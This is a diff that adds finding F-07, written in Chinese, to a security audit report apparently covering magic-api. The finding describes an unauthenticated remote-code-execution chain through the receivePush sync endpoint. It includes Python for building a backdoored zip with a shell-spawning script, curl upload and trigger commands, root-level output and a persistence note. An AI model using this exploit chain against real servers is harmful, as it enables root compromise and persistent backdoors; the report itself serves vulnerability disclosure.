@@ -4,6 +4,41 @@
 
 ---
 
+## 🚨 F-07 严重升级：未授权 RCE 链（登录无关）
+
+**推翻上一轮“receivePush 仅 DoS”结论**。开启鉴权后，`receivePush` 仍无需登录 token；管理员可能仅将 `secret-key` 作为集群同步密钥，误以为“已开鉴权就安全”。实测发现可注入带后门的 .ms 文件并触发 RCE。
+
+**完整利用链**：
+1. F-06 登录 token = `MD5(user||pass)`（需知道密码）——**本链不需要**
+2. 仅需知道 `secret-key`（与登录密码独立的另一套弱凭证）
+3. 构造 zip 结构：`api/<grp>/group.json` + `api/<grp>/<name>.ms` + **显式目录条目**（`dirs()` 仅识别 `endsWith("/")` 条目，漏加则静默 no-op）
+4. 签 `MD5(timestamp|full|MD5(zipBytes)|secretKey)` 上传
+5. 触发 `/<grp>/<path>` → 任意命令执行
+
+```python
+# zip 结构关键片段（ms 格式 = json + \r\n================================\r\n + script）
+script = 'import java.lang.ProcessBuilder\nimport java.util.Scanner\nvar p = new ProcessBuilder("/bin/sh","-c","id; hostname").start();\nvar out = new Scanner(p.getInputStream()).useDelimiter("\\\\A");\nreturn out.hasNext() ? out.next() : "";'
+z.writestr('api/pwn/', b'')          # 显式目录条目
+z.writestr('api/pwn/group.json', group_json)
+z.writestr('api/pwn/evil.ms', ms_json + "\r\n" + "="*32 + "\r\n" + script)
+```
+
+```bash
+# 无 token 上传 + 触发
+curl -s -X POST http://target:9999/_magic-api-sync \
+  -F "file=@pwn.zip;type=application/zip" \
+  -F "mode=full" -F "timestamp=$TS" -F "sign=$SIGN"
+curl -s http://target:9999/pwn/evil
+# → {"code":1,"data":"uid=0(root) gid=0(root) groups=0(root)\n<hostname>\n"}
+```
+
+**持久化**：上传的 `.ms` 写入 `magic-api.resource.location` 磁盘目录。`docker restart mtest2` 后重调 `pwn/evil` 仍返回 `uid=0(root)` → 重启存活。
+
+**前提条件**：管理员必须配置 `magic-api.secret-key`（集群同步场景）——一旦配置，`receivePush` 就**绕过 `DefaultAuthorizationInterceptor` 登录**；攻击者需知密或弱密暴力猜解（本测试用 `test-secret-key-123`）。
+
+---
+
+
 ### 基线：鉴权边界确认
 
 | 请求 | 无 token 响应 | 结论 |
